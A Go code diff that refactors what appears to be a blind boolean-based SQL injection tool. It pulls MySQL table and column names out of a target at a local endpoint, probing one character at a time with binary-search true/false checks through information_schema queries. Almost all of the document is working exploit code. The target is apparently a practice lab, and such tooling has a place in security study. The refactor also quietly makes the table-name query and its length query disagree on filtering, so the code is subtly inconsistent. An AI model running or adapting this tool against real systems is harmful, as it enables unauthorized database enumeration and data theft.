@@ -62,7 +62,6 @@ func (c *HTTPClient) SendPayload(payload string) (Observation, error) {
 	if err != nil {
 		return Observation{}, fmt.Errorf("http client new do request %w", err)
 	}
-
 	defer resp.Body.Close()
 
 	limitedReader := io.LimitReader(resp.Body, 1024*1024)
@@ -111,15 +110,15 @@ func (c *HTTPClient) IsTrue(condition string) (bool, error) {
 	return strings.Contains(obs.Body, "Product found"), nil
 }
 
-func (c *HTTPClient) ExtractInt(sqlQuery string, maxLen int) (int, error) {
+func (c *HTTPClient) ExtractInt(sqlQuery string, maxValue int) (int, error) {
 	low := 0
-	high := maxLen
+	high := maxValue
 
 	for low < high {
 		mid := (low + high) / 2
-		payload := buildCountGreaterCondition(sqlQuery, mid)
+		condition := buildCountGreaterCondition(sqlQuery, mid)
 
-		ok, err := c.IsTrue(payload)
+		ok, err := c.IsTrue(condition)
 		if err != nil {
 			return 0, err
 		}
@@ -137,16 +136,16 @@ func (c *HTTPClient) ExtractInt(sqlQuery string, maxLen int) (int, error) {
 func (c *HTTPClient) ExtractString(sqlQuery string, maxLen int) (string, error) {
 	var result strings.Builder
 
-	for i := 1; i <= maxLen; i++ {
+	for position := 1; position <= maxLen; position++ {
 		low := ASCIIMin
 		high := ASCIIMax
 
 		for low < high {
 			mid := (low + high) / 2
 
-			payload := buildCharGreaterCondition(sqlQuery, i, mid)
+			condition := buildCharGreaterCondition(sqlQuery, position, mid)
 
-			ok, err := c.IsTrue(payload)
+			ok, err := c.IsTrue(condition)
 			if err != nil {
 				return "", err
 			}
@@ -157,93 +156,129 @@ func (c *HTTPClient) ExtractString(sqlQuery string, maxLen int) (string, error) 
 				high = mid
 			}
 		}
+
 		result.WriteRune(rune(low))
 	}
 
 	return result.String(), nil
 }
 
+// --------------------
+// MySQL SQL expressions
+// --------------------
+
+func mysqlTableCountExpr() string {
+	return "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()"
+}
+
+func mysqlTableNameLengthExpr(offset int) string {
+	return fmt.Sprintf(
+		"SELECT CHAR_LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_type='BASE TABLE' ORDER BY table_name LIMIT 1 OFFSET %d",
+		offset,
+	)
+}
+
+func mysqlTableNameExpr(offset int) string {
+	return fmt.Sprintf(
+		"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() ORDER BY table_name LIMIT 1 OFFSET %d",
+		offset,
+	)
+}
+
+func mysqlColumnCountExpr(tableName string) string {
+	return fmt.Sprintf(
+		"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s'",
+		tableName,
+	)
+}
+
+func mysqlColumnNameLengthExpr(tableName string, offset int) string {
+	return fmt.Sprintf(
+		"SELECT CHAR_LENGTH(column_name) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s' ORDER BY column_name LIMIT 1 OFFSET %d",
+		tableName,
+		offset,
+	)
+}
+
+func mysqlColumnNameExpr(tableName string, offset int) string {
+	return fmt.Sprintf(
+		"SELECT column_name FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s' ORDER BY column_name LIMIT 1 OFFSET %d",
+		tableName,
+		offset,
+	)
+}
+
+// --------------------
+// Main enum flow
+// --------------------
+
 func main() {
 	baseURL := "http://127.0.0.1:5007/boolean"
+
 	client, err := NewHTTPClient(baseURL, 5*time.Second)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
 	}
 
-	tableCountExpr := "SELECT COUNT(*) FROM information_schema.tables WHERE table_schema=DATABASE()"
-	tableCountRes, err := client.ExtractInt(tableCountExpr, 32)
+	tableCountRes, err := client.ExtractInt(mysqlTableCountExpr(), 32)
 	if err != nil {
 		fmt.Fprintln(os.Stderr, err)
 		os.Exit(1)
 	}
+
 	fmt.Println("Table count:", tableCountRes)
 
 	tableNames := make([]string, 0)
-	for i := 0; i < tableCountRes; i++ {
-		sqlQuery := fmt.Sprintf(
-			"SELECT CHAR_LENGTH(table_name) FROM information_schema.tables WHERE table_schema=DATABASE() AND table_type='BASE TABLE' ORDER BY table_name LIMIT 1 OFFSET %d",
-			i,
-		)
-		lengthTablename, err := client.ExtractInt(sqlQuery, 64)
-		if err != nil {
-			fmt.Fprintln(os.Stderr, err)
-			os.Exit(1)
-		}
-		fmt.Println("Length of table name:", lengthTablename)
 
-		sqlQuery = fmt.Sprintf(
-			"SELECT table_name FROM information_schema.tables WHERE table_schema=DATABASE() AND table_type='BASE TABLE' ORDER BY table_name LIMIT 1 OFFSET %d",
-			i,
-		)
-		tableName, err := client.ExtractString(sqlQuery, lengthTablename)
+	for i := 0; i < tableCountRes; i++ {
+		lengthTableName, err := client.ExtractInt(mysqlTableNameLengthExpr(i), 64)
 		if err != nil {
 			fmt.Fprintln(os.Stderr, err)
 			os.Exit(1)
 		}
+
+		fmt.Println("Length of table name:", lengthTableName)
+
+		tableName, err := client.ExtractString(mysqlTableNameExpr(i), lengthTableName)
+		if err != nil {
+			fmt.Fprintln(os.Stderr, err)
+			os.Exit(1)
+		}
+
 		fmt.Println("Table name:", tableName)
+
 		tableNames = append(tableNames, tableName)
+
 		fmt.Println()
 	}
 
-	columnNames := make([]string, 0)
 	for _, tableName := range tableNames {
 		fmt.Println()
 		fmt.Println("TABLE NAME:", tableName)
-		sqlQuery := fmt.Sprintf(
-			"SELECT COUNT(*) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s'",
-			tableName,
-		)
-		columnCount, err := client.ExtractInt(sqlQuery, 32)
+
+		columnCount, err := client.ExtractInt(mysqlColumnCountExpr(tableName), 32)
 		if err != nil {
 			fmt.Fprintln(os.Stderr, err)
 			os.Exit(1)
 		}
 
 		fmt.Println("Columns count:", columnCount)
+
 		for i := 0; i < columnCount; i++ {
-			sqlQuery = fmt.Sprintf(
-				"SELECT CHAR_LENGTH(column_name) FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s' ORDER BY column_name LIMIT 1 OFFSET %d",
-				tableName,
-				i,
-			)
-			lengthColumnName, err := client.ExtractInt(sqlQuery, 64)
+			lengthColumnName, err := client.ExtractInt(mysqlColumnNameLengthExpr(tableName, i), 64)
 			if err != nil {
 				fmt.Fprintln(os.Stderr, err)
 				os.Exit(1)
 			}
-			sqlQuery = fmt.Sprintf(
-				"SELECT column_name FROM information_schema.columns WHERE table_schema = DATABASE() AND table_name = '%s' ORDER BY column_name LIMIT 1 OFFSET %d",
-				tableName,
-				i,
-			)
-			columnName, err := client.ExtractString(sqlQuery, lengthColumnName)
+
+			columnName, err := client.ExtractString(mysqlColumnNameExpr(tableName, i), lengthColumnName)
 			if err != nil {
 				fmt.Fprintln(os.Stderr, err)
 				os.Exit(1)
 			}
+
 			fmt.Println("Column name:", columnName)
-			columnNames = append(columnNames, columnName)
 		}
 	}
 }
